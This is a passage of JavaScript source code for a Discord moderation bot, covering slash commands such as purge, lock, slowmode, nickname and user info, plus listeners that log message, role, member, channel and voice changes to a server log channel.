        return interaction.reply({ content: `⏱️ Timed out **${target.user.tag}** for ${minutes}m.` });
      } else {
        await target.timeout(null, reason);

        const c = await createCase(guild, {
          targetId: target.id,
          targetTag: target.user.tag,
          moderatorId: interaction.user.id,
          moderatorTag: interaction.user.tag,
          type: 'Untimeout',
          reason
        });

        await logEvent(
          guild,
          'Timeout Removed',
          [
            { name: 'Case ID', value: `#${c.id}` },
            { name: 'User', value: formatUser(target.user) },
            { name: 'Moderator', value: formatUser(interaction.user) }
          ],
          '#2ECC71'
        );

        return interaction.reply({ content: `✅ Removed timeout from **${target.user.tag}**.` });
      }
    }

    // --------------------------------------------------------------
    // /purge
    // --------------------------------------------------------------
    if (commandName === 'purge') {
      if (!hasPermission(interaction, PermissionFlagsBits.ManageMessages)) {
        return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      }

      const amount = options.getInteger('amount');
      await interaction.deferReply({ flags: MessageFlags.Ephemeral });

      let remaining = amount;
      let totalDeleted = 0;

      while (remaining > 0) {
        const batch = Math.min(remaining, 100);
        const deleted = await interaction.channel.bulkDelete(batch, true).catch(() => null);
        if (!deleted || deleted.size === 0) break;
        totalDeleted += deleted.size;
        remaining -= batch;
        if (deleted.size < batch) break;
      }

      await createCase(guild, {
        targetId: interaction.user.id,
        targetTag: interaction.user.tag,
        moderatorId: interaction.user.id,
        moderatorTag: interaction.user.tag,
        type: 'Purge',
        reason: `${totalDeleted} messages in ${interaction.channel.name}`
      });

      await logEvent(
        guild,
        'Messages Purged',
        [
          { name: 'Channel', value: formatChannel(interaction.channel) },
          { name: 'Messages Deleted', value: `${totalDeleted}` },
          { name: 'Moderator', value: formatUser(interaction.user) }
        ],
        '#F1C40F'
      );

      return interaction.editReply({ content: `🧹 Deleted ${totalDeleted} messages.` });
    }

    // --------------------------------------------------------------
    // /lock & /unlock
    // --------------------------------------------------------------
    if (commandName === 'lock' || commandName === 'unlock') {
      if (!hasPermission(interaction, PermissionFlagsBits.ManageChannels)) {
        return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      }

      const channel = options.getChannel('channel') || interaction.channel;
      const lockState = commandName === 'lock' ? false : null;

      await channel.permissionOverwrites.edit(guild.roles.everyone, {
        SendMessages: lockState,
        AddReactions: lockState
      });

      await logEvent(
        guild,
        commandName === 'lock' ? 'Channel Locked' : 'Channel Unlocked',
        [
          { name: 'Channel', value: formatChannel(channel) },
          { name: 'Moderator', value: formatUser(interaction.user) }
        ],
        commandName === 'lock' ? '#E67E22' : '#2ECC71'
      );

      return interaction.reply({ content: `${commandName === 'lock' ? '🔒 Locked' : '🔓 Unlocked'} ${channel}.` });
    }

    // --------------------------------------------------------------
    // /slowmode
    // --------------------------------------------------------------
    if (commandName === 'slowmode') {
      if (!hasPermission(interaction, PermissionFlagsBits.ManageChannels)) {
        return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      }

      const channel = options.getChannel('channel') || interaction.channel;
      const seconds = options.getInteger('seconds');

      await channel.setRateLimitPerUser(seconds);

      await logEvent(
        guild,
        'Slowmode Updated',
        [
          { name: 'Channel', value: formatChannel(channel) },
          { name: 'Slowmode', value: `${seconds} seconds` },
          { name: 'Moderator', value: formatUser(interaction.user) }
        ],
        '#3498DB'
      );

      return interaction.reply({ content: `🐢 Set slowmode to ${seconds}s for ${channel}.` });
    }

    // --------------------------------------------------------------
    // /nick
    // --------------------------------------------------------------
    if (commandName === 'nick') {
      if (!hasPermission(interaction, PermissionFlagsBits.ManageNicknames)) {
        return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      }

      const target = options.getMember('target');
      const nickname = options.getString('nickname');

      if (!target || !target.manageable) {
        return interaction.reply({ content: '❌ Cannot change target nickname.', flags: MessageFlags.Ephemeral });
      }

      await target.setNickname(nickname || null);

      await logEvent(
        guild,
        'Nickname Changed',
        [
          { name: 'User', value: formatUser(target.user) },
          { name: 'New Nickname', value: nickname || '*Cleared*' },
          { name: 'Moderator', value: formatUser(interaction.user) }
        ],
        '#3498DB'
      );

      return interaction.reply({ content: `✅ Nickname updated for **${target.user.tag}**.` });
    }

    // --------------------------------------------------------------
    // /deafen & /undeafen & /move
    // --------------------------------------------------------------
    if (commandName === 'deafen' || commandName === 'undeafen' || commandName === 'move') {
      if (!hasPermission(interaction, PermissionFlagsBits.MoveMembers)) {
        return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      }

      const target = options.getMember('target');
      if (!target?.voice?.channel) {
        return interaction.reply({ content: '❌ Target is not in a voice channel.', flags: MessageFlags.Ephemeral });
      }

      if (commandName === 'deafen' || commandName === 'undeafen') {
        const status = commandName === 'deafen';
        await target.voice.setDeaf(status);

        await logEvent(
          guild,
          status ? 'Member Deafened' : 'Member Undeafened',
          [
            { name: 'User', value: formatUser(target.user) },
            { name: 'Moderator', value: formatUser(interaction.user) }
          ],
          status ? '#E67E22' : '#2ECC71'
        );

        return interaction.reply({ content: `🔊 Member ${status ? 'deafened' : 'undeafened'}.` });
      }

      const channel = options.getChannel('channel');
      await target.voice.setChannel(channel);

      await logEvent(
        guild,
        'Member Moved Voice Channel',
        [
          { name: 'User', value: formatUser(target.user) },
          { name: 'Destination', value: formatChannel(channel) },
          { name: 'Moderator', value: formatUser(interaction.user) }
        ],
        '#3498DB'
      );

      return interaction.reply({ content: `🔊 Moved **${target.user.tag}** to ${channel}.` });
    }

    // --------------------------------------------------------------
    // INFORMATION COMMANDS
    // --------------------------------------------------------------
    if (commandName === 'userinfo') {
      const targetUser = options.getUser('target');
      const target = await guild.members.fetch(targetUser.id).catch(() => null);

      const embed = new EmbedBuilder()
        .setTitle(`👤 ${targetUser.tag}`)
        .setThumbnail(targetUser.displayAvatarURL())
        .addFields(
          { name: 'User ID', value: targetUser.id, inline: true },
          { name: 'Created', value: `<t:${Math.floor(targetUser.createdTimestamp / 1000)}:R>`, inline: true },
          { name: 'Joined', value: target ? `<t:${Math.floor(target.joinedTimestamp / 1000)}:R>` : 'N/A', inline: true },
          { name: 'Nickname', value: target?.nickname || 'None', inline: true },
          { name: 'Roles', value: target ? target.roles.cache.map(r => `${r}`).join(' ') : 'None' }
        )
        .setColor('#5865F2');

      return interaction.reply({ embeds: [embed] });
    }

    if (commandName === 'avatar' || commandName === 'serveravatar' || commandName === 'banner') {
      const user = options.getUser('target') || interaction.user;

      if (commandName === 'banner') {
        const fetched = await client.users.fetch(user.id, { force: true });
        const banner = fetched.bannerURL({ size: 1024 });
        return interaction.reply({ content: banner ? banner : '❌ User has no banner.' });
      }

      if (commandName === 'serveravatar') {
        const memberTarget = await guild.members.fetch(user.id).catch(() => null);
        const sAvatar = memberTarget?.avatarURL({ size: 1024 });
        return interaction.reply({ content: sAvatar ? sAvatar : '❌ User has no server-specific avatar.' });
      }

      return interaction.reply({ content: user.displayAvatarURL({ size: 1024 }) });
    }

    if (commandName === 'membercount') {
      return interaction.reply({ content: `👥 Members: **${guild.memberCount}**` });
    }

    if (commandName === 'roles') {
      const roleList = guild.roles.cache.filter(r => r.id !== guild.id).map(r => `${r}`).join(', ');
      const embed = new EmbedBuilder()
        .setTitle(`📜 Server Roles (${guild.roles.cache.size - 1})`)
        .setDescription(truncate(roleList, 4000))
        .setColor('#5865F2');
      return interaction.reply({ embeds: [embed] });
    }

    if (commandName === 'roleinfo') {
      const role = options.getRole('role');
      const embed = new EmbedBuilder()
        .setTitle(`🎭 Role: ${role.name}`)
        .addFields(
          { name: 'ID', value: role.id, inline: true },
          { name: 'Color', value: role.hexColor, inline: true },
          { name: 'Position', value: `${role.position}`, inline: true },
          { name: 'Mentionable', value: `${role.mentionable}`, inline: true },
          { name: 'Hoisted', value: `${role.hoist}`, inline: true },
          { name: 'Managed', value: `${role.managed}`, inline: true }
        )
        .setColor(role.color || '#5865F2');
      return interaction.reply({ embeds: [embed] });
    }

    if (commandName === 'channelinfo') {
      const channel = options.getChannel('channel') || interaction.channel;
      const embed = new EmbedBuilder()
        .setTitle(`📺 Channel: ${channel.name}`)
        .addFields(
          { name: 'ID', value: channel.id, inline: true },
          { name: 'Type', value: `${channel.type}`, inline: true },
          { name: 'Category', value: channel.parent ? channel.parent.name : 'None', inline: true },
          { name: 'Position', value: `${channel.position}`, inline: true },
          { name: 'NSFW', value: `${channel.nsfw || false}`, inline: true }
        )
        .setColor('#5865F2');
      return interaction.reply({ embeds: [embed] });
    }

    if (commandName === 'settings') {
      const config = settingsCache[guild.id] || {};
      const embed = new EmbedBuilder()
        .setTitle(`⚙️ Config — ${guild.name}`)
        .addFields(
          { name: 'Log Channel', value: config.logChannelId ? `<#${config.logChannelId}>` : 'Not Set' },
          { name: 'Admin Roles', value: (config.adminRoleIds || []).map(id => `<@&${id}>`).join(' ') || 'None' }
        )
        .setColor('#5865F2');
      return interaction.reply({ embeds: [embed], flags: MessageFlags.Ephemeral });
    }

  } catch (err) {
    console.error(`[Command Error] /${commandName}:`, err);
    if (!interaction.replied) {
      await interaction.reply({ content: '⚠️ Execution error.', flags: MessageFlags.Ephemeral });
    }
  }
});

// ------------------------------------------------------------------
// 10. DETAILED LOGGING LISTENERS (NO MESSAGE CREATE LOGGING)
// ------------------------------------------------------------------

// Message Edit Logging
client.on(Events.MessageUpdate, async (oldMessage, newMessage) => {
  if (!newMessage.guild || newMessage.author?.bot) return;
  if (oldMessage.content === newMessage.content) return;

  await logEvent(
    newMessage.guild,
    '✏️ Message Edited',
    [
      { name: 'Author', value: formatUser(newMessage.author) },
      { name: 'Channel', value: formatChannel(newMessage.channel) },
      { name: 'Before', value: truncate(oldMessage.content) },
      { name: 'After', value: truncate(newMessage.content) },
      { name: 'URL', value: newMessage.url }
    ],
    '#F1C40F'
  );
});

// Message Delete Logging
client.on(Events.MessageDelete, async message => {
  if (!message.guild || message.author?.bot) return;

  const executor = await getAuditExecutor(message.guild, AuditLogEvent.MessageDelete, message.author?.id);

  await logEvent(
    message.guild,
    '🗑️ Message Deleted',
    [
      { name: 'Author', value: formatUser(message.author) },
      { name: 'Channel', value: formatChannel(message.channel) },
      { name: 'Deleted By', value: executor ? formatUser(executor) : 'Unknown / unavailable' },
      { name: 'Content', value: truncate(message.content) }
    ],
    '#E74C3C'
  );
});

// Bulk Delete Logging
client.on(Events.MessageBulkDelete, async (messages, channel) => {
  const guild = channel.guild;
  if (!guild) return;

  const executor = await getAuditExecutor(guild, AuditLogEvent.MessageDelete, null);
  const ids = Array.from(messages.keys());
  const displayIds = ids.slice(0, 50).join(', ');
  const extra = ids.length > 50 ? `\n*(+ ${ids.length - 50} more)*` : '';

  await logEvent(
    guild,
    '🧹 Bulk Messages Deleted',
    [
      { name: 'Channel', value: formatChannel(channel) },
      { name: 'Amount', value: `${messages.size}` },
      { name: 'Executor', value: executor ? formatUser(executor) : 'Unknown / unavailable' },
      { name: 'Deleted Message IDs', value: displayIds + extra }
    ],
    '#E67E22'
  );
});

// Role Logging (Detailed Diffs)
client.on(Events.RoleCreate, async role => {
  const executor = await getAuditExecutor(role.guild, AuditLogEvent.RoleCreate, role.id);
  const perms = permissionNames(role.permissions.bitfield).join(', ') || 'None';

  await logEvent(
    role.guild,
    '✨ Role Created',
    [
      { name: 'Role', value: formatRole(role) },
      { name: 'Color', value: role.hexColor },
      { name: 'Hoisted', value: `${role.hoist}` },
      { name: 'Permissions', value: truncate(perms) },
      { name: 'Created By', value: executor ? formatUser(executor) : 'Unknown' }
    ],
    '#2ECC71'
  );
});

client.on(Events.RoleDelete, async role => {
  const executor = await getAuditExecutor(role.guild, AuditLogEvent.RoleDelete, role.id);

  await logEvent(
    role.guild,
    '🔥 Role Deleted',
    [
      { name: 'Role Name', value: role.name },
      { name: 'Role ID', value: role.id },
      { name: 'Deleted By', value: executor ? formatUser(executor) : 'Unknown' }
    ],
    '#E74C3C'
  );
});

client.on(Events.RoleUpdate, async (oldRole, newRole) => {
  const executor = await getAuditExecutor(newRole.guild, AuditLogEvent.RoleUpdate, newRole.id);
  const fields = [{ name: 'Role', value: formatRole(newRole) }];

  if (oldRole.name !== newRole.name) fields.push({ name: 'Name Change', value: `${oldRole.name} → ${newRole.name}` });
  if (oldRole.hexColor !== newRole.hexColor) fields.push({ name: 'Color Change', value: `${oldRole.hexColor} → ${newRole.hexColor}` });
  if (oldRole.hoist !== newRole.hoist) fields.push({ name: 'Hoisted', value: `${oldRole.hoist} → ${newRole.hoist}` });
  if (oldRole.mentionable !== newRole.mentionable) fields.push({ name: 'Mentionable', value: `${oldRole.mentionable} → ${newRole.mentionable}` });

  // Permissions diff
  const oldPerms = permissionNames(oldRole.permissions.bitfield);
  const newPerms = permissionNames(newRole.permissions.bitfield);
  const { added, removed } = diffList(oldPerms, newPerms);

  if (added.length) fields.push({ name: 'Permissions Added', value: added.map(p => `+ ${p}`).join('\n') });
  if (removed.length) fields.push({ name: 'Permissions Removed', value: removed.map(p => `- ${p}`).join('\n') });

  fields.push({ name: 'Updated By', value: executor ? formatUser(executor) : 'Unknown' });

  if (fields.length > 2) {
    await logEvent(newRole.guild, '🎭 Role Updated', fields, '#9B59B6');
  }
});

// Member Audit Logging
client.on(Events.GuildMemberAdd, async member => {
  await logEvent(
    member.guild,
    '📥 Member Joined',
    [
      { name: 'User', value: formatUser(member.user) },
      { name: 'Account Age', value: `<t:${Math.floor(member.user.createdTimestamp / 1000)}:R>` },
      { name: 'Total Members', value: `${member.guild.memberCount}` }
    ],
    '#2ECC71'
  );
});

client.on(Events.GuildMemberRemove, async member => {
  const kickAudit = await getAuditExecutor(member.guild, AuditLogEvent.MemberKick, member.id);

  await logEvent(
    member.guild,
    '📤 Member Left / Removed',
    [
      { name: 'User', value: formatUser(member.user) },
      { name: 'Status', value: kickAudit ? `Kicked by ${formatUser(kickAudit)}` : 'Left voluntarily or banned' }
    ],
    '#E74C3C'
  );
});

client.on(Events.GuildMemberUpdate, async (oldMember, newMember) => {
  const executor = await getAuditExecutor(newMember.guild, AuditLogEvent.MemberUpdate, newMember.id);
  const fields = [{ name: 'Member', value: formatUser(newMember.user) }];

  if (oldMember.nickname !== newMember.nickname) {
    fields.push({ name: 'Nickname', value: `${oldMember.nickname || 'None'} → ${newMember.nickname || 'None'}` });
  }

  const oldRoles = oldMember.roles.cache.map(r => r.id);
  const newRoles = newMember.roles.cache.map(r => r.id);
  const { added, removed } = diffList(oldRoles, newRoles);

  if (added.length) fields.push({ name: 'Roles Added', value: added.map(id => `<@&${id}>`).join(', ') });
  if (removed.length) fields.push({ name: 'Roles Removed', value: removed.map(id => `<@&${id}>`).join(', ') });

  fields.push({ name: 'Updated By', value: executor ? formatUser(executor) : 'Unknown' });

  if (fields.length > 2) {
    await logEvent(newMember.guild, '👤 Member Updated', fields, '#9B59B6');
  }
});

// Channel Logging
client.on(Events.ChannelCreate, async channel => {
  if (!channel.guild) return;
  const executor = await getAuditExecutor(channel.guild, AuditLogEvent.ChannelCreate, channel.id);

  await logEvent(
    channel.guild,
    '📺 Channel Created',
    [
      { name: 'Channel', value: formatChannel(channel) },
      { name: 'Type', value: `${channel.type}` },
      { name: 'Created By', value: executor ? formatUser(executor) : 'Unknown' }
    ],
    '#2ECC71'
  );
});

client.on(Events.ChannelDelete, async channel => {
  if (!channel.guild) return;
  const executor = await getAuditExecutor(channel.guild, AuditLogEvent.ChannelDelete, channel.id);

  await logEvent(
    channel.guild,
    '🔥 Channel Deleted',
    [
      { name: 'Channel Name', value: channel.name },
      { name: 'ID', value: channel.id },
      { name: 'Deleted By', value: executor ? formatUser(executor) : 'Unknown' }
    ],
    '#E74C3C'
  );
});

client.on(Events.ChannelUpdate, async (oldChannel, newChannel) => {
  if (!newChannel.guild) return;
  const executor = await getAuditExecutor(newChannel.guild, AuditLogEvent.ChannelUpdate, newChannel.id);
  const fields = [{ name: 'Channel', value: formatChannel(newChannel) }];

  if (oldChannel.name !== newChannel.name) fields.push({ name: 'Name', value: `${oldChannel.name} → ${newChannel.name}` });
  if (oldChannel.topic !== newChannel.topic) fields.push({ name: 'Topic', value: `${oldChannel.topic || 'None'} → ${newChannel.topic || 'None'}` });
  if (oldChannel.rateLimitPerUser !== newChannel.rateLimitPerUser) fields.push({ name: 'Slowmode', value: `${oldChannel.rateLimitPerUser}s → ${newChannel.rateLimitPerUser}s` });

  fields.push({ name: 'Updated By', value: executor ? formatUser(executor) : 'Unknown' });

  if (fields.length > 2) {
    await logEvent(newChannel.guild, '⚙️ Channel Updated', fields, '#9B59B6');
  }
});

// Voice Logging
client.on(Events.VoiceStateUpdate, async (oldState, newState) => {
  const guild = newState.guild;
  if (!guild) return;

  const member = newState.member?.user;

  if (!oldState.channelId && newState.channelId) {
    await logEvent(guild, '🔊 Voice Channel Joined', [
      { name: 'User', value: formatUser(member) },
      { name: 'Channel', value: formatChannel(newState.channel) }
    ], '#3498DB');
    return;
  }

  if (oldState.channelId && !newState.channelId) {
    await logEvent(guild, '🔇 Voice Channel Left', [
      { name: 'User', value: formatUser(member) },
      { name: 'Channel', value: formatChannel(oldState.channel) }
    ], '#E67E22');
    return;
  }

  if (oldState.channelId !== newState.channelId) {
    await logEvent(guild, '🎙️ Voice Channel Moved', [
      { name: 'User', value: formatUser(member) },
      { name: 'From', value: formatChannel(oldState.channel) },
      { name: 'To', value: formatChannel(newState.channel) }
    ], '#9B59B6');
  }
});

// ------------------------------------------------------------------
// 11. BOT LOGIN
// ------------------------------------------------------------------
client.login(process.env.DISCORD_TOKEN || process.env.TOKEN);
